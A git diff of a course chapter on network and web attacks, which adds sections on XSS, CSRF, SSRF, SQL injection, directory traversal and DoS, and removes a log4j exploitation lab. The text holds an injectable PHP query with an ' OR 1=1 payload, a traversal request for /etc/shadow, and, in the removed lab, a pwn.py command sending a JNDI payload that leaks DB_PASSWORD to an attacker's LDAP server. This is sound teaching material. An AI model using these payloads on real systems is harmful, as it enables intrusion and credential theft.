@@ -1,4 +1,4 @@
-= Attacks (WIP)
+= Attacks
 
 == Interception Attacks
 
@@ -254,6 +254,181 @@ In this scenario an attacker responds to a Link-Local Multicast Name Resolution 
 The unexpecting victim fills in their credentials, which are promptly stolen.
 This attack can be mitigated by disabling LLMNR on the network.
 
+== Web-based Attacks
+
+The world wide web and the protocols/formats/languages it uses (HTTP, HTML, JavaScript, etc.) were _not_ originally designed with security in mind.
+By default, web pages trust the content they receive to not be malicious.
+Scripts, commands, cookies, etc. are implicitly trusted.
+Web technologies have become so popular that they are a common target for attackers and developers must use tokens, sanitize data, and check inputs if they want those technologies to be secure.
+
+https://owasp.org/[The Open Web Application Security Project (OWASP)] is a great source of resources for web application security.
+They maintain a top 10 list of web application security risks. As of 2021, the https://owasp.org/www-project-top-ten/[OWASP top 10] is:
+
+* Broken Access Control
+* Cryptographic Failures
+* Injection
+* Insecure Design
+* Security Misconfiguration
+* Vulnerable and Outdated Components
+* Identification and Authentication Failures
+* Software and Data Integrity Failures
+* Security Logging and Monitoring Failures
+* Server-Side Request Forgery
+
+=== XSS
+
+Cross-Site scripting refers to the process by which a bad actor can inject a script into a website.
+Recall that many websites take inputs from forms and may later display that data on another page.
+If that data isn't just data, but actually a JavaScript script, that script may run on the page that displays it.
+
+Using this technique attackers can access cookies, session tokens, and other sensitive information.
+Depending on where the script was injected and how the server displays that data the script could be stored permanently on the target server.
+XSS scripts may also be reflected, typically sent in links, where they are only used for one session.
+
+To mitigate XSS risks, it is important that a web developer sanitize their inputs.
+When a form is submitted, the website should check that the data submitted isn't a script or other malicious content.
+If the data does cannot be cleaned, it shouldn't be stored or used.
+
+.Samy Worm
+****
+One October 4th, 2005 an XSS worm spread across MySpace, the dominant social network at the time.
+The worm was written by Samy Kamkar as a simple post that when read would cause a viewers machine to make their own post stating "but most of all, samy is my hero" and including the code to propagate.
+The results was that within 20 hours over one million users had run the payload.
+
+Now Samy is a prominent security consultant and you can read https://samy.pl/myspace/tech.html[his full technical explanation of the worm here].
+Vice Motherboard also did a segment on Samy for their https://www.youtube.com/watch?v=DtnuaHl378M[_Greatest Moments in Hacking History_ series].
+****
+
+=== CSRF
+
+Cross-Site Request Forgery (CSRF) involves using an victims already authenticated session in a request that is not part of that session.
+Imagine you are logged into Twitter.
+An attacker sends you a form link in GMail, that when clicked on posts a tweet that says, "I'm a CSRF victim."
+Assuming Twitter accepts the form submission you will now have a tweet in your timeline that states "I'm a CSRF victim."
+
+This is probably the most benign scenario, you can imagine things be much worse with an online banking application.
+The solution is for the website (Twitter in this case) to use a CSRF token (which it does).
+When the form is generated, a random value is included as a hidden input.
+That random, hidden input is the CSRF token.
+When a submission is made, if the CSRF token submitted does not match the one created for the form (which only the valid website knows) the submission is not accepted.
+
+CSRF tokens are yet another example of how web applications require proactive security as opposed to being secure by design.
+Most web apps are employing them, but it can be easy for a developer to forget.
+
+=== SSRF
+
+[svgbob, ssrf, align=center]
+....
+<---------------------------- Internet ---------------------------> | <----------- Intranet ---------------->
+                                                                    
+                                                                    |
+.----------. "GET https://example.com/id?content=http://10.0.0.1/secret"   .-----------. Request  .--------.
+|          | ------------------------------------------------------------> |           | -------> |        |
+| Attacker | "Response: secret"                                            |example.com| Response |10.0.0.1|
+|          | <------------------------------------------------------------ |           | <------- |        |
+'----------'                                                        |      '-----------'          '--------'
+
+                                                                    |
+....
+
+Web systems often communicate with internal servers the retrieve information.
+These may be API servers, databases, or messaging servers.
+If an attacker can fool a web server into passing a malicious request to its internal server, the attacker and abuse the internal trust of the system.
+This is referred to a server-side request forgery (SSRF).
+Once again, this kind of attack is mitigated with input validation, which needs to be included in the application.
+
+=== Session Hijacking
+
+Session hijacking may involve other methods of compromise, but the end goal is to "steal" a session between the victim and another server.
+Imagine the following scenario: A person logs in to their personal banking website, which issues them a cookie which proves they are authenticated.
+A bad actor is monitoring the connections through an XSS exploit that forwards all connection cookies to them.
+The bad actor uses the cookie that was issued to make a transfer from the user's bank account to the bad actors bank account.
+
+Depending on the method used, session hijacking may be prevented through use of a better session key or by requiring transport layer security (TLS) to connect.
+In the above scenario the only way to prevent session hijacking would be to repair the initial XSS vulnerability.
+
+=== SQL Injection
+
+As mentioned in the SSRF section, almost all web systems are supported by other servers running internally.
+One of the most common scenarios is to have a web server which reaches out to an internal database.
+Relational databases utilize structured query language (SQL) so a web application may generate many different SQL queries during its regular operations.
+If a user input is placed directly into the query, it can be possible to make the result function in a way that was not intended or yield secret information from the database.
+
+Take a look at the following PHP code:
+
+[source, php]
+----
+$userName = $_POST['user_name']
+$pw = $_POST['password']
+$statement = "SELECT * FROM users WHERE name='" + $userName + "' AND password='" + $pw + "';"
+----
+
+In the case where the user_name `admin` and the password `password` were submitted, the following SQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='password';`
+
+In the case where the user_name `admin` and the password `' OR 1=1;` were submitted, the following SQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='' OR 1=1;`
+
+In this second case, a user could login without needing a valid password.
+
+=== XML Injection
+
+XML stands for extensible markup language, and it is often used to transfer messages.
+XML can be an important part of a web systems infrastructure and as such if unsanitized user inputs are allowed to generate XML the is used in the system many things can go wrong.
+Using XML injection an attacker may be able to retrieve secret files or create admin accounts.
+XML injection can be mitigated by input validation or possibly disabling the resolution of external entities in the framework being used.
+
+=== LDAP Injection
+
+Finally, Lightweight Directory Access Protocol (LDAP) is often used to store information about users.
+As such, it can be found behind many web applications.
+LDAP also supports complex queries in a similar fashion to SQL.
+An unsantized user input can lead to a LDAP query with unexpected results.
+
+=== Directory Traversal
+
+A poorly designed web server may be subject to a directory traversal attack.
+Recall that web servers are designed to serve static content from a particular directory, `/var/www` for example.
+Now suppose that an attacker submitted a `GET` request for `http://www.example.com/../../etc/shadow`.
+It is possible that the web server may actually go up two directories and serve that file.
+
+This can be addressed with file permissions, access controls, and filtering incoming requests.
+It is important to note that there is more than one way to specify a path in an HTTP request, including using URL encoding, so all possible malicious inputs must be sanitized. 
+
+=== URL Hijacking/Typosquating
+
+An unfortunately common, broad-based attack is to buy a domain with a similar name to a very popular domain.
+When users mistype the popular domain they end up at the malicious actor's website.
+For example, imagine if someone registered `gooogle.com` (note the three o's).
+They could gain a lot of traffic from people who mistyped google.
+
+These sites could be used for ad revenue, phishing credentials, or even possibly to distribute malware.
+A mitigation that several browsers implement is to keep a list of malicious websites and warn users before they visit them.
+
+=== Domain Hijacking
+
+Domain names expire after a certain period of time and the registrant may forget to renew.
+In these rare occasions an attacker may actually gain control of a popular domain name, google.com for example, and route traffic to their site.
+The malicious activities are the same as for typosquating, but the attacker does not need to rely on the users making a mistake.
+
+It is also possible to hijack a domain by logging into the domain registration system using stolen/compromised credentials.
+In this scenario an attacker could still modify a record to point to their server, but wouldn't have to rely on the company forgetting to renew.
+
+=== Zone Transfer Attacks
+
+On the subject of the domain name system, zone transfer attacks may leak sensitive information about domains. 
+DNS is a distributed system by design and is used for resolving domain names into IP addresses.
+Due to the distributed nature of the system, protocols were built in for having a single domain served by multiple servers.
+These servers pass information to each other using a DNS zone transfer.
+
+Typically these communications should be internal as they may leak valuable information regarding the zone.
+Unfortunately an improperly configured DNS server may advertise its zone transfers publicly.
+https://digi.ninja/projects/zonetransferme.php[In such a situation an attacker can use the leaked information in the recon phase of an attack.]
+
+=== Clickjacking
+
+A website may be designed in such a way that the interface is confusing to the user and they inadvertently click on an advertisement or malicious link.
+This is common practice on low integrity websites such as streaming sites, torrent trackers, and adult websites.
+It is often complicated by a poor ad screening or even purposefully making ads that look similar to the content.
+
 == Outcomes
 
 === Remote Code Execution (RCE)
@@ -300,6 +475,18 @@ Vertical privilege escalation gives higher level access, ie. moving from a user 
 The five main ways privilege escalation is achieved are credential exploitation, vulnerabilities/exploits, misconfigurations, malware, and social engineering.
 
 === Denial of Service (DoS)
+
+A denial of service attack (Dos) attempts to keep a system from working by overwhelming it with requests.
+A distributed denial of service attack (DDoS) does the same thing by utilizing many different machines.
+Typically the attacking nodes for a DDoS attack are members of a botnet, machines that have been exploited previously and are under the attackers control.
+
+DoS attacks can take many forms including:
+
+SYN Floods:: A malicious actor can send multiple SYN packets to initiate the TCP three-way handshake. SYN packets are easy to send, but may cause significant resources to be allocated on the server responding to them. Due to the asymettric nature of resource allocation this makes the use of SYN packets particularly suited to DoS attack. https://en.wikipedia.org/wiki/SYN_cookies[SYN cookies] can be used to help prevent this kind of attack.
+
+ICMP Floods:: Often referred to as pinging, ICMP echo requests can be used to overwhelm a server. Especially when sent from multiple sources. The solution is typically to rate limit ICMP packets on the server.
+
+Buffer Overflows/Exploits:: Poorly designed software may fail when it receives unexpected data. This could be something as simple as sending more data than a buffer can hold, or https://en.wikipedia.org/wiki/WinNuke[setting the urgent pointer (URG) on a packet destined for port 139 of a Windows system].
 
 == Lab: MitM with Scapy
 
@@ -688,148 +875,6 @@ How would https://www.ssh.com/academy/ssh/host-key[managing host keys correctly]
 ====
 
 To stop the running containers, you can type Ctrl-C in the terminal running `docker-compose up`, exit out of the victim, and exit out of the attacker.
-
-== Lab: Exploiting log4j
-
-In this lab we will examine the log4j vulnerability, https://nvd.nist.gov/vuln/detail/CVE-2021-44228[CVE-2021-44228].
-This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. 
-Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file.
-This file can contain any code that the attacker wishes to inject into the server process.
-
-[IMPORTANT.deliverable]
-====
-Do some research: What versions of log4j are affected by this vulnerability?
-====
-
-This lab uses a Docker Compose configuration to simulate a network with an attacker and a target.
-The target runs a https://github.com/leonjza/log4jpwn[known-vulnerable, example application] written by leonjza.
-This example application logs the `User-Agent` header, request path, and a query string parameter of a request as seen below:
-
-.App.java
-[source, java]
-----
-package com.sensepost.log4jpwn;
-
-import org.apache.logging.log4j.Logger;
-import org.apache.logging.log4j.LogManager;
-
-import static spark.Spark.*;
-
-public class App {
-    static final Logger logger = LogManager.getLogger(App.class.getName());
-
-    public static void main(String[] args) {
-
-        port(8080);
-
-        get("/*", (req, res) -> {
-
-            String ua = req.headers("User-Agent");
-            String pwn = req.queryParams("pwn");
-            String pth = req.pathInfo();
-
-            System.out.println("logging ua: " + ua);
-            System.out.println("logging pwn: " + pwn);
-            System.out.println("logging pth: " + pth);
-
-            // trigger
-            logger.error(ua);
-            logger.error(pwn);
-            logger.error(pth);
-
-            return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;
-        });
-    }
-}
-----
-
-[IMPORTANT.deliverable]
-====
-What port does our vulnerable app run on? 
-====
-
-Our attacker container has https://github.com/leonjza/log4jpwn/blob/master/pwn.py[the `pwn.py` script], also by leonjza, which does two things:
-
-. Runs a fake LDAP server in the background on port 8888
-. Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
-. Parses and prints the response
-
-Using this setup we can show how log4j can be used to leak sensitive information from running processes.
-We will use it to leak the value of the environment variable `DB_PASSWORD`.
-As it isn't uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.
-
-Start by downloading https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true[the zip archive of this lab] and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you've done that, you can bring the lab up by typing `docker-compose up` in that directory. Output should look similar to what you see below:
-
-[source, console]
-----
-PS C:\Users\rxt1077\it230\labs\log4j> docker-compose up
-[+] Running 2/0
- - Container log4j-target-1    Created                                                            0.0s
- - Container log4j-attacker-1  Created                                                            0.0s
-Attaching to log4j-attacker-1, log4j-target-1
-log4j-attacker-1 exited with code 0
-log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
-log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
-log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:8080
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
-log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms
-----
-
-You'll notice that the `target` service is up and running the `log4jpwn` example application and that its output goes straight to the screen.
-The `attacker` service will exit immediately as it is meant for interactive use and doesn't run anything in the background.
-In another terminal, navigate to the lab directory again and run `docker-compose run attacker bash`. This will be the shell that you use to attack the target:
-
-[source, console]
-----
-PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash
-root@3971c61303c8:/# <1>
-----
-<1> Notice how the prompt changes once we are in the container
-
-In the attack shell, use the `ip` command to determine the IPv4 address of your container.
-We will need this since the `attacker` container will be listening for connections from `target` once the exploit string is logged.
-
-[source, console]
-----
-root@3971c61303c8:/# ip addr show dev eth0
-58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
-    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
-    inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0 <1>
-       valid_lft forever preferred_lft forever
-----
-<1> You're IP is _not_ `<IP_ADDRESS>` it is whatever you find in its place!
-
-Once you have the IP address, you can run the `pwn.py` script on the `attacker` container and you should be able to read the `DB_PASSWORD` environment variable on the `target` container.
-
-[source, console]
-----
-root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host <IP_ADDRESS> --target http://target:8080 --leak '${env:DB_PASSWORD}' <1>
- i| starting server on <IP_ADDRESS>:8888
- i| server started
- i| setting payload in User-Agent header
- i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}} to http://target:8080/
- i| new connection from <TARGETS_IP>:44050
- v| extracted value: <DB_PASSWORD> <2>
- i| request url was: http://target:8080/
- i| response status code: 200
-----
-<1> Docker Compose will resolve service names to IP addresses so the target URI doesn't require finding an IP
-<2> The value of `DB_PASSWORD` can will be here.
-
-[IMPORTANT.deliverable]
-====
-What is the database password?
-====
-
-[IMPORTANT.deliverable]
-====
-What steps would you take to mitigate the risk of a deployed application having this vulnerability?
-====
 
 == Review Questions
 
